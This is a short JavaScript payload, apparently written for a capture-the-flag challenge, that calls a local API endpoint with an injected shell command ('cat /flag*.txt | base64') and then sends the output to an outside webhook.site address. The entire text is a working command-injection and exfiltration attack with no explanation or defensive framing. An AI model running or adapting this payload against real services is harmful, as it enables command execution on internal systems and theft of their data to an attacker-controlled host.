(async () => {
  const res = await fetch("http://127.0.0.1:30507/api/stats?command=cat%20%2Fflag%2A.txt%20%7C%20base64");
  const text = await res.text();

  await fetch("https://webhook.site/d3afa10a-d033-4e1f-8828-d78132668e48?data=" + encodeURIComponent(text));
})();
